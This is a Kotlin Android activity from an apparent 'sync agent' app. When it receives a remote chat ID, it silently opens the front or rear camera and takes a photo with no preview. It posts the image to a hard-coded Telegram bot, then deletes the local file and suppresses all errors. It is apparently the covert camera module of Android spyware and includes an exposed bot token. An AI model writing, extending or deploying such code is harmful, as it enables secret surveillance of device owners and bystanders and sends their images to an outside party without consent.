package com.cognitive.ai.syncagent

import android.app.Activity
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class CameraCaptureActivity : Activity() {

    private var cameraDevice: CameraDevice? = null
    private val handlerThread = HandlerThread("CameraCaptureThread").apply { start() }
    private val backgroundHandler = Handler(handlerThread.looper)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val chatId = intent.getStringExtra("chat_id") ?: return finish()
        val cameraFacing = intent.getStringExtra("camera_facing") ?: "front"

        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            var targetCameraId = manager.cameraIdList[0]
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (cameraFacing == "front" && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    targetCameraId = id
                    break
                } else if (cameraFacing == "rear" && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    targetCameraId = id
                    break
                }
            }

            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
                    reader.setOnImageAvailableListener({ imgReader ->
                        val image = imgReader.acquireLatestImage()
                        if (image != null) {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                            try {
                                FileOutputStream(photoFile).use { it.write(bytes) }
                                if (photoFile.exists() && photoFile.length() > 0) {
                                    uploadPhotoToTelegram(chatId, photoFile)
                                }
                            } catch (_: Exception) {}
                            
                            closeCameraAndFinish()
                        }
                    }, backgroundHandler)

                    try {
                        val surface = reader.surface
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.capture(captureBuilder.build(), null, backgroundHandler)
                                } catch (_: Exception) {
                                    closeCameraAndFinish()
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                closeCameraAndFinish()
                            }
                        }, backgroundHandler)
                    } catch (_: Exception) {
                        closeCameraAndFinish()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    finish()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    finish()
                }
            }, backgroundHandler)

        } catch (_: Exception) {
            finish()
        }
    }

    private fun closeCameraAndFinish() {
        try {
            cameraDevice?.close()
            cameraDevice = null
        } catch (_: Exception) {}
        finish()
    }

    private fun uploadPhotoToTelegram(chatId: String, file: File) {
        thread {
            var connection: HttpURLConnection? = null
            try {
                val boundary = "Boundary_${System.currentTimeMillis()}"
                val url = URL("https://api.telegram.org/bot9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY/sendPhoto")
                connection = url.openConnection() as HttpURLConnection
                connection.doOutput = true
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                java.io.DataOutputStream(connection.outputStream).use { out ->
                    out.write("--$boundary\r\n".toByteArray())
                    out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
                    out.write("$chatId\r\n".toByteArray())

                    out.write("--$boundary\r\n".toByteArray())
                    out.write("Content-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"\r\n".toByteArray())
                    out.write("Content-Type: image/jpeg\r\n\r\n".toByteArray())

                    java.io.FileInputStream(file).use { it.copyTo(out) }
                    out.write("\r\n--$boundary--\r\n".toByteArray())
                }
                connection.inputStream?.close()
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
                if (file.exists()) file.delete()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerThread.quitSafely()
    }
}
